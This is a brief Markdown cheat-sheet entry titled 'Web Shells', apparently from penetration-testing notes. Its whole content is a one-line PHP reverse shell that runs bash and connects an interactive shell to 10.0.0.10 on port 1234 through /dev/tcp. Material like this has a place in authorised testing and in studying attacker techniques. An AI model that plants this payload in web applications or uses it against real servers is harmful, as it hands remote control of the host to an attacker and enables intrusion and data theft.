# Web Shells

## PHP shells

**tiny reverse shell**
```
exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
```
